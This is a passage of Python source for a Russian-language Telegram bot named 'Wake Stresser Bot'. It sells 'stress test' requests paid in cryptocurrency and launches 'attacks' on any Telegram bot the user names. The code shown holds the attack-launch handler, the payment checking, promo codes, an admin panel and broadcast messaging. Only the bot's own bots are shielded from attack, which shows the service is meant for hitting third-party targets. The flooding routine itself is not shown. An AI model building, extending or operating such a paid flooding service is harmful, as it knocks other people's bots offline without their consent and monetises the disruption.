                await event.answer("⏳ Платёж ещё не получен. Подождите 5-10 минут.", alert=True)
    
    async def _show_stress_menu(self, event):
        user = self.db.get_user(event.sender_id)
        
        if not user or user['requests_balance'] <= 0:
            await event.answer("❌ У вас нет запросов на балансе!", alert=True)
            return
        
        await event.edit(
            f"⚡ **Запуск Stress теста**\n\n"
            f"📊 Доступно запросов: {user['requests_balance']}\n"
            f"⏱️ 1 запрос = {REQUEST_DURATION} секунд\n"
            f"🎁 Бесплатных при регистрации: {FREE_REQUESTS_ON_START}\n\n"
            "**Формат команды:**\n"
            "`@username количество_запросов`\n\n"
            "**Пример:**\n"
            "`@testbot 100` - 100 запросов\n\n"
            "**Защита:** Нельзя атаковать ботов с 'wake', 'stress' в имени\n\n"
            "Отправьте команду в чат:",
            buttons=[[Button.inline("🔙 Назад", b"main_menu")]]
        )
    
    async def _show_stats(self, event):
        user = self.db.get_user(event.sender_id)
        if not user:
            return
        
        stats_text = f"📊 **Ваша статистика**\n\n"
        stats_text += f"🆔 ID: `{user['user_id']}`\n"
        stats_text += f"📛 Username: @{user['username'] or 'нет'}\n"
        stats_text += f"💰 Баланс: `{user['requests_balance']}` запросов\n"
        stats_text += f"📤 Использовано: `{user['requests_used']}` запросов\n"
        stats_text += f"💵 Потрачено: `${user['total_spent'] or 0:.2f}`\n"
        stats_text += f"🎁 Бесплатных получено: `{FREE_REQUESTS_ON_START if user['free_requests_given'] else 0}`\n"
        stats_text += f"📅 Регистрация: `{user['registration_date'][:10] if user['registration_date'] else 'нет'}`"
        
        await event.edit(
            stats_text,
            buttons=[[Button.inline("🔙 Назад", b"main_menu")]]
        )
    
    # ========== АДМИН ПАНЕЛЬ ==========
    async def _show_admin_panel(self, event):
        if event.sender_id != ADMIN_ID:
            await event.answer("❌ Доступ запрещён!", alert=True)
            return
        
        stats = self.db.get_stats()
        
        await event.edit(
            f"👑 **Админ панель**\n\n"
            f"📊 **Статистика:**\n"
            f"👥 Пользователей: {stats['total_users']}\n"
            f"🔥 Активных: {stats['active_users']}\n"
            f"💰 Доход: ${stats['total_income']:.2f}\n"
            f"🎯 Атак: {stats['total_attacks']}\n"
            f"🎁 Бесплатных выдано: {stats['free_requests_given']}\n\n"
            f"**Меню админа:**",
            buttons=[
                [Button.inline("📊 Статистика", b"admin_stats"),
                 Button.inline("👥 Пользователи", b"admin_users")],
                [Button.inline("🎁 Промокоды", b"admin_promo"),
                 Button.inline("💳 Платежи", b"admin_payments")],
                [Button.inline("📢 Рассылка", b"admin_broadcast")],
                [Button.inline("🔙 Назад", b"main_menu")]
            ]
        )
    
    async def _show_admin_stats(self, event):
        stats = self.db.get_stats()
        
        stats_text = f"📊 **Детальная статистика**\n\n"
        stats_text += f"**Общее:**\n"
        stats_text += f"👥 Всего пользователей: {stats['total_users']}\n"
        stats_text += f"🔥 Активных пользователей: {stats['active_users']}\n"
        stats_text += f"💰 Общий доход: ${stats['total_income']:.2f}\n"
        stats_text += f"📊 Всего запросов в системе: {stats['total_requests']}\n"
        stats_text += f"⚡ Использовано запросов: {stats['total_used']}\n"
        stats_text += f"🎯 Всего атак: {stats['total_attacks']}\n"
        stats_text += f"🎁 Бесплатных запросов выдано: {stats['free_requests_given']}\n\n"
        
        stats_text += f"**Финансы:**\n"
        stats_text += f"💵 Средний чек: ${stats['total_income'] / max(stats['total_users'], 1):.2f}\n"
        stats_text += f"🎁 Стоимость бесплатных запросов: ${stats['free_requests_given'] * FREE_REQUESTS_ON_START * REQUEST_PRICE:.2f}"
        
        await event.edit(
            stats_text,
            buttons=[
                [Button.inline("🔄 Обновить", b"admin_stats")],
                [Button.inline("🔙 Назад", b"admin_panel")]
            ]
        )
    
    async def _show_admin_users(self, event):
        users = self.db.get_all_users(limit=20)
        
        if not users:
            await event.edit("👥 **Пользователи не найдены**")
            return
        
        text = "👥 **Последние 20 пользователей**\n\n"
        for user in users:
            free = "🎁" if user['free_requests_given'] else ""
            text += f"🆔 {user['user_id']} | @{user['username'] or 'нет'} | {user['requests_balance']} запр. {free}\n"
        
        await event.edit(
            text,
            buttons=[
                [Button.inline("🔄 Обновить", b"admin_users")],
                [Button.inline("🔙 Назад", b"admin_panel")]
            ]
        )
    
    async def _show_admin_promo_panel(self, event):
        promo_codes = self.db.get_all_promo_codes()
        
        text = "🎁 **Промокоды**\n\n"
        
        if not promo_codes:
            text += "Промокодов нет\n\n"
        else:
            for promo in promo_codes[:10]:
                remaining = promo['max_uses'] - promo['used_count']
                text += f"• `{promo['code']}` - {promo['requests']} запр. ({remaining} осталось)\n"
        
        text += "\n**Создать промокод:**\n`/promo код количество_запросов использование`\n"
        text += "Пример: `/promo TEST100 100 10`"
        
        await event.edit(
            text,
            buttons=[
                [Button.inline("🔄 Обновить", b"admin_promo")],
                [Button.inline("🔙 Назад", b"admin_panel")]
            ]
        )
    
    async def _show_admin_payments(self, event):
        payments = self.db.get_pending_payments()
        
        text = "💳 **Ожидающие платежи**\n\n"
        
        if not payments:
            text += "Ожидающих платежей нет\n"
        else:
            for payment in payments[:10]:
                text += f"• `{payment['invoice_id']}` - ${payment['amount_usd']:.2f}\n"
                text += f"  👤 {payment['user_id']} | {payment['status']}\n"
                if payment['status'] == 'pending':
                    text += f"  [✅ Подтвердить](buttonurl:check_pay_{payment['invoice_id']})\n"
        
        await event.edit(
            text,
            buttons=[
                [Button.inline("🔄 Обновить", b"admin_payments")],
                [Button.inline("🔙 Назад", b"admin_panel")]
            ]
        )
    
    async def _approve_payment(self, event, payment_id):
        payment = self.db.get_crypto_payment(payment_id)
        
        if not payment:
            await event.answer("❌ Платёж не найден!", alert=True)
            return
        
        self.db.mark_crypto_payment_paid(payment['crypto_invoice_id'])
        
        try:
            user_id = payment['user_id']
            requests = int(payment['amount_usd'] / REQUEST_PRICE)
            await self.bot_client.send_message(
                user_id,
                f"✅ **Админ подтвердил ваш платёж!**\n\n"
                f"💰 Сумма: ${payment['amount_usd']:.2f}\n"
                f"🎁 Зачислено: {requests} запросов\n"
                f"📊 Теперь можете запускать атаки!"
            )
        except:
            pass
        
        await event.edit(
            f"✅ Платёж {payment_id} подтверждён!\n"
            f"👤 Пользователь: {payment['user_id']}\n"
            f"💰 Сумма: ${payment['amount_usd']:.2f}\n"
            f"🎁 Запросов: {int(payment['amount_usd'] / REQUEST_PRICE)}",
            buttons=[[Button.inline("🔙 Назад", b"admin_payments")]]
        )
    
    async def _start_broadcast(self, event):
        await event.edit(
            "📢 **Рассылка сообщений**\n\n"
            "Отправьте сообщение для рассылки всем пользователям.\n"
            "Или отправьте команду:\n"
            "`/broadcast ваше_сообщение`\n\n"
            "⚠️ Будьте осторожны, отменить рассылку нельзя!",
            buttons=[[Button.inline("🔙 Назад", b"admin_panel")]]
        )
    
    # ========== ОБРАБОТЧИКИ КОМАНД ==========
    async def _handle_stress_command(self, event, text: str):
        user = self.db.get_user(event.sender_id)
        if not user or user['requests_balance'] <= 0:
            return
        
        parts = text.split()
        if len(parts) < 2:
            return
        
        bot_username = parts[0].replace('@', '')
        
        if any(x in bot_username.lower() for x in ['wake', 'stress', 'stresser']):
            await event.respond("❌ **Защита от дурака**\n\nНельзя атаковать своих ботов!")
            return
        
        try:
            requests = int(parts[1])
            
            if user['requests_balance'] < requests:
                await event.respond(f"❌ Недостаточно запросов! Нужно: {requests}, есть: {user['requests_balance']}")
                return
            
            result = await self.stresser.stress_bot(bot_username, requests)
            
            if result['success']:
                self.db.use_requests(event.sender_id, requests)
                self.db.create_attack(result['attack_id'], event.sender_id, bot_username, requests)
                
                await event.respond(
                    f"✅ **Атака запущена!**\n\n"
                    f"🎯 Цель: @{bot_username}\n"
                    f"📊 Запросов: {requests}\n"
                    f"⏱️ Длительность: {requests * REQUEST_DURATION} сек\n"
                    f"🆔 ID: `{result['attack_id']}`\n\n"
                    f"Баланс списан: {requests} запросов"
                )
            else:
                await event.respond(f"❌ Ошибка: {result['error']}")
                
        except ValueError:
            await event.respond("❌ Неверный формат количества запросов!")
        except Exception as e:
            await event.respond(f"❌ Ошибка: {str(e)}")
    
    async def _handle_promo_command(self, event, text: str):
        try:
            code = text.split()[1].upper()
            user_id = event.sender_id
            
            requests = self.db.use_promo_code(user_id, code)
            
            if requests:
                self.db.add_requests(user_id, requests)
                
                await event.respond(
                    f"🎁 **Промокод активирован!**\n\n"
                    f"Код: `{code}`\n"
                    f"🎁 Получено: {requests} запросов\n"
                    f"📊 Теперь можете запускать атаки!"
                )
            else:
                await event.respond("❌ Промокод недействителен или уже использован!")
        except:
            await event.respond("❌ Неверный формат промокода!")
    
    async def _handle_admin_command(self, event, text: str):
        if text.upper().startswith('GIVE '):
            try:
                parts = text.split()
                if len(parts) != 3:
                    await event.respond("❌ Формат: GIVE user_id количество")
                    return
                
                target = parts[1]
                requests = int(parts[2])
                
                if target.startswith('@'):
                    user_entity = await self.bot_client.get_entity(target)
                    target_id = user_entity.id
                else:
                    target_id = int(target)
                
                self.db.add_requests(target_id, requests)
                
                await event.respond(f"✅ Выдано {requests} запросов пользователю {target_id}")
            except Exception as e:
                await event.respond(f"❌ Ошибка: {str(e)}")
        
        elif text.upper().startswith('PROMO '):
            try:
                parts = text.split()
                if len(parts) != 4:
                    await event.respond("❌ Формат: PROMO код запросы использование")
                    return
                
                code = parts[1].upper()
                requests = int(parts[2])
                uses = int(parts[3])
                
                if self.db.create_promo_code(code, requests, uses, ADMIN_ID):
                    await event.respond(
                        f"✨ **Промокод создан!**\n\n"
                        f"Код: `{code}`\n"
                        f"🎁 Запросов: {requests}\n"
                        f"🔄 Использований: {uses}\n\n"
                        f"Для активации: `PROMO {code}`"
                    )
                else:
                    await event.respond("❌ Промокод уже существует!")
            except Exception as e:
                await event.respond(f"❌ Ошибка: {str(e)}")
        
        elif text.upper().startswith('/BROADCAST '):
            if event.sender_id != ADMIN_ID:
                return
            
            try:
                message = text[len('/BROADCAST '):].strip()
                if not message:
                    await event.respond("❌ Сообщение не может быть пустым")
                    return
                
                await event.respond(f"⏳ Начинаю рассылку: \"{message[:50]}...\"")
                
                users = self.db.get_all_users()
                sent = 0
                failed = 0
                
                for user in users:
                    try:
                        await self.bot_client.send_message(user['user_id'], message)
                        sent += 1
                        await asyncio.sleep(0.1)
                    except:
                        failed += 1
                
                await event.respond(
                    f"✅ **Рассылка завершена!**\n\n"
                    f"📤 Отправлено: {sent}\n"
                    f"❌ Не отправлено: {failed}\n"
                    f"📊 Всего пользователей: {len(users)}"
                )
            except Exception as e:
                await event.respond(f"❌ Ошибка рассылки: {str(e)}")
        
        elif text.upper().startswith('APPROVE '):
            if event.sender_id != ADMIN_ID:
                return
            
            try:
                invoice_id = text.split()[1]
                payment = self.db.get_crypto_payment(invoice_id)
                
                if payment:
                    self.db.mark_crypto_payment_paid(payment['crypto_invoice_id'])
                    await event.respond(f"✅ Платёж {invoice_id} подтверждён!")
                else:
                    await event.respond("❌ Платёж не найден!")
            except Exception as e:
                await event.respond(f"❌ Ошибка: {str(e)}")
    
    async def start(self):
        """Запуск бота"""
        if not await self.initialize():
            logging.error("❌ Не удалось инициализировать бота")
            return
        
        print("\n" + "="*50)
        print("🔥 WAKE STRESSER BOT")
        print(f"🤖 Юзернейм бота: @WakeStresserBot")
        print(f"💎 С Crypto Pay оплатой")
        print(f"🎁 Бесплатных запросов: {FREE_REQUESTS_ON_START}")
        print(f"👑 Админ: {ADMIN_ID}")
        print(f"📢 Канал: {CHANNEL_USERNAME}")
        print("📝 Требуется bio с @WakeStresserBot")
        print("="*50 + "\n")
        
        try:
            await self.bot_client.send_message(
                ADMIN_ID,
                "✅ **Бот запущен!**\n\n"
                "**Новые функции:**\n"
                "• Crypto Pay оплата\n"
                "• Stress атака ботов\n"
                "• Проверка bio с @WakeStresserBot\n"
                "• 3 бесплатных запроса при регистрации\n"
                "• Промокоды\n"
                "• Админ панель\n\n"
                "**Команды админа:**\n"
                "• /start - меню\n"
                "• GIVE user_id количество - выдать запросы\n"
                "• PROMO код запросы использование - промокод\n"
                "• /broadcast текст - рассылка\n"
                "• APPROVE invoice_id - подтвердить платёж"
            )
        except Exception as e:
            logging.error(f"Не удалось отправить сообщение админу: {e}")
        
        asyncio.create_task(self._check_payments_loop())
        
        await self.bot_client.run_until_disconnected()
    
    async def _check_payments_loop(self):
        while True:
            try:
                pending = self.db.get_pending_payments()
                
                if pending:
                    crypto_ids = [p['crypto_invoice_id'] for p in pending if p['crypto_invoice_id']]
                    
                    if crypto_ids:
                        invoices = await self.crypto_api.get_invoices(crypto_ids)
                        
                        if invoices:
                            for invoice in invoices:
                                if invoice.get('status') == 'paid':
                                    crypto_id = invoice.get('invoice_id')
                                    self.db.mark_crypto_payment_paid(crypto_id)
                                    
                                    for payment in pending:
                                        if payment['crypto_invoice_id'] == crypto_id:
                                            try:
                                                requests = int(payment['amount_usd'] / REQUEST_PRICE)
                                                await self.bot_client.send_message(
                                                    payment['user_id'],
                                                    f"✅ **Платёж подтверждён!**\n\n"
                                                    f"💰 Сумма: ${payment['amount_usd']:.2f}\n"
                                                    f"🎁 Зачислено: {requests} запросов\n"
                                                    f"📊 Теперь можете запускать атаки!"
                                                )
                                            except:
                                                pass
                                            break
                
                await asyncio.sleep(60)
                
            except Exception as e:
                logging.error(f"Ошибка в проверке платежей: {e}")
                await asyncio.sleep(30)

# ==================== ЗАПУСК ====================
async def main():
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    bot = WakeStresserBot()
    
    try:
        await bot.start()
    except KeyboardInterrupt:
        print("\n🛑 Бот остановлен")
    except Exception as e:
        print(f"❌ Ошибка: {e}")
    finally:
        if hasattr(bot, 'db'):
            bot.db.close()
        if hasattr(bot, 'crypto_api'):
            await bot.crypto_api.close()

if __name__ == "__main__":
    print("🚀 Запускаю Wake Stresser Bot...")
    asyncio.run(main())